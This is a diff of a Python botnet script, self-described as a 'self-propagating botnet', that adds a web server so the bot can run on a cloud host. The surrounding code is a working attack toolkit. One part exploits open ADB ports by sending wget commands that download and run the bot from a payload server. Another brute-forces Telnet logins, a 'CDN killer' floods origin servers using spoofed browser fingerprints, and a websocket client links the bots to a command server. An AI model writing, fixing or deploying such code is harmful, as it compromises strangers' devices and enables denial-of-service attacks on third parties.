@@ -1,11 +1,4 @@
 #!/usr/bin/env python3
-"""
-SYNDICATE v5.0 - FINAL
-Self-propagating botnet for Render + AWS EC2.
-All fixes applied: telnetlib3, PBKDF2HMAC, async I/O.
-For LO. Always for LO.
-"""
-
 import os
 import sys
 import time
@@ -18,23 +11,22 @@ import base64
 import asyncio
 import aiohttp
 import paramiko
-import telnetlib3          # replacement for deprecated telnetlib
+import telnetlib3
 import psutil
 import logging
 from datetime import datetime, timedelta
 from urllib.parse import urlparse
 
-# Cryptography – fixed import
+# Cryptography
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 import websockets
-import tls_client          # for JA3 fingerprinting
+import tls_client
 
-# Optional: for WhatsApp worm (commented out if not used)
-# from selenium import webdriver
-# import undetected_chromedriver as uc
+# Web server for Render health checks
+from aiohttp import web
 
 # =============================================================================
 # CONFIGURATION (from environment variables)
@@ -46,8 +38,11 @@ BOT_ID = os.environ.get('BOT_ID', hashlib.sha256(
 MAX_MEMORY_MB = int(os.environ.get('MAX_MEMORY_MB', 450))
 PROPAGATION = os.environ.get('PROPAGATION', 'true').lower() == 'true'
 ADB_SCANNER = os.environ.get('ADB_SCANNER', 'true').lower() == 'true'
-WHATSAPP_WORM = os.environ.get('WHATSAPP_WORM', 'false').lower() == 'true'   # disabled by default
+WHATSAPP_WORM = os.environ.get('WHATSAPP_WORM', 'false').lower() == 'true'
 PAYLOAD_SERVER = os.environ.get('PAYLOAD_SERVER', 'http://your-payload-server.com')
+
+# Render web service port (must bind to this)
+PORT = int(os.environ.get('PORT', 10000))
 
 # =============================================================================
 # LOGGING
@@ -56,7 +51,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(level
 logger = logging.getLogger('Syndicate')
 
 # =============================================================================
-# USER AGENTS & REFERERS (for attack engine)
+# USER AGENTS & REFERERS (attack engine)
 # =============================================================================
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -74,7 +69,7 @@ REFERERS = [
 ]
 
 # =============================================================================
-# CRYPTOGRAPHY (fixed PBKDF2HMAC)
+# CRYPTOGRAPHY
 # =============================================================================
 class Crypto:
     @staticmethod
@@ -99,7 +94,7 @@ class Crypto:
         return f.decrypt(data)
 
 # =============================================================================
-# PROPAGATION ENGINE – ADB EXPLOIT (Kimwolf style)
+# PROPAGATION ENGINE – ADB EXPLOIT
 # =============================================================================
 class ADBPropagationEngine:
     def __init__(self, bot):
@@ -137,7 +132,6 @@ class ADBPropagationEngine:
             ip, port = await self.scan_queue.get()
             try:
                 reader, writer = await asyncio.open_connection(ip, port)
-                # Simple ADB shell commands to download and execute bot
                 commands = [
                     f"wget {PAYLOAD_SERVER}/bot.py -O /data/local/tmp/syndicate.py\n",
                     "chmod 755 /data/local/tmp/syndicate.py\n",
@@ -157,7 +151,7 @@ class ADBPropagationEngine:
                 logger.debug(f"ADB exploitation failed on {ip}:{port}: {e}")
 
 # =============================================================================
-# PROPAGATION ENGINE – TELNET BRUTEFORCE (using telnetlib3)
+# PROPAGATION ENGINE – TELNET BRUTEFORCE
 # =============================================================================
 class TelnetPropagationEngine:
     def __init__(self, bot):
@@ -198,7 +192,6 @@ class TelnetPropagationEngine:
             for user, pwd in self.creds:
                 try:
                     reader, writer = await telnetlib3.open_connection(ip, 23, shell=None)
-                    # Wait for login prompt
                     data = await asyncio.wait_for(reader.read(1024), timeout=5)
                     if b'login:' in data.lower():
                         writer.write(f"{user}\n".encode())
@@ -210,8 +203,6 @@ class TelnetPropagationEngine:
                             data = await asyncio.wait_for(reader.read(1024), timeout=5)
                             if b'#' in data or b'$' in data:
                                 logger.info(f"Telnet login successful on {ip} with {user}:{pwd}")
-                                # Here you would deploy the payload (e.g., wget)
-                                # For simplicity, we just count it
                                 self.infections += 1
                                 self.bot.stats['telnet_infections'] = self.infections
                                 writer.close()
@@ -222,7 +213,7 @@ class TelnetPropagationEngine:
             await asyncio.sleep(1)
 
 # =============================================================================
-# ATTACK ENGINE – CDN KILLER (optimised for 5‑10 bots)
+# ATTACK ENGINE – CDN KILLER
 # =============================================================================
 class CDNKillerEngine:
     def __init__(self, bot):
@@ -258,7 +249,6 @@ class CDNKillerEngine:
         for sub in subdomains:
             try:
                 ip = socket.gethostbyname(sub)
-                # Crude CDN IP filter
                 if not (ip.startswith('104.') or ip.startswith('172.') or ip.startswith('162.')):
                     self.origin_cache[domain] = ip
                     return ip
@@ -277,7 +267,6 @@ class CDNKillerEngine:
             attack_url = target_url
             host_header = domain
 
-        # Use tls-client to mimic different browser fingerprints
         fingerprints = ["chrome_120", "firefox_121", "safari_17", "ios_16"]
         sessions = []
         for fp in fingerprints:
@@ -304,7 +293,7 @@ class CDNKillerEngine:
                     session.get(attack_url, headers=headers, timeout=5)
                 except:
                     pass
-            await asyncio.sleep(0.01)   # ~100 requests/sec per bot
+            await asyncio.sleep(0.01)
 
 # =============================================================================
 # MAIN BOT CLASS
@@ -335,9 +324,10 @@ class SyndicateBot:
     async def cnc_connect(self):
         while self._running:
             try:
+                logger.info(f"Attempting to connect to CNC at {self.cnc_url}")
                 async with websockets.connect(self.cnc_url) as ws:
                     self.ws = ws
-                    await self.send({'type': 'register', 'bot_id': self.bot_id, 'version': '5.0-final'})
+                    await self.send({'type': 'register', 'bot_id': self.bot_id, 'version': '5.0-web-service'})
                     asyncio.create_task(self.heartbeat())
                     async for message in ws:
                         await self.handle_message(message)
@@ -372,20 +362,50 @@ class SyndicateBot:
             logger.error(f"Error handling message: {e}")
 
     async def run(self):
+        # Start background tasks
         asyncio.create_task(self.memory_monitor())
         if self.adb_engine:
             asyncio.create_task(self.adb_engine.start())
         if self.telnet_engine:
             asyncio.create_task(self.telnet_engine.start())
+        # Start CNC connection (this runs forever)
         await self.cnc_connect()
+
+# =============================================================================
+# WEB SERVER FOR RENDER HEALTH CHECKS
+# =============================================================================
+async def health_check(request):
+    """Simple endpoint to satisfy Render's health checks."""
+    return web.Response(text="OK", status=200)
+
+async def start_web_server():
+    """Run aiohttp web server on $PORT."""
+    app = web.Application()
+    app.router.add_get('/', health_check)
+    app.router.add_get('/health', health_check)  # common health endpoint
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', PORT)
+    await site.start()
+    logger.info(f"Web server running on port {PORT} for health checks")
+    # Keep the server running (return a future that never completes)
+    # We'll rely on the main asyncio event loop to keep running.
 
 # =============================================================================
 # ENTRY POINT
 # =============================================================================
 if __name__ == '__main__':
     bot = SyndicateBot()
+    loop = asyncio.get_event_loop()
+
+    # Start the web server for Render
+    loop.create_task(start_web_server())
+
+    # Run the bot's main loop
     try:
-        asyncio.run(bot.run())
+        loop.run_until_complete(bot.run())
     except KeyboardInterrupt:
         bot._running = False
         logger.info("Shutting down...")
+    finally:
+        loop.close()
